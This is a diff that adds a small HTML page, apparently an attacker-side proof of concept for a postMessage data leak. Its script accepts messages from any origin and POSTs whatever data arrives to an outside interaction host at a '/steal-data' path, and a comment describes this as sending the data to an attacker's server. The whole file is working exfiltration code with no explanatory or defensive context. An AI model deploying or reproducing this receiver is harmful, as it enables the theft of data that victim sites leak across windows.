@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<body>
+<script>
+    window.addEventListener("message", receiveMessage, false);
+
+    function receiveMessage(event){
+        if (event.data) {
+            console.log("Received data: ", event.data);
+
+            // Simulating sending this data to attacker's server
+            fetch("http://owofkr92garqk8zt8b12nh5lvc13pudj.oastify.com/steal-data", {
+                method: "POST",
+                body: event.data
+            });
+        }
+    }
+</script>
+</body>
+</html>
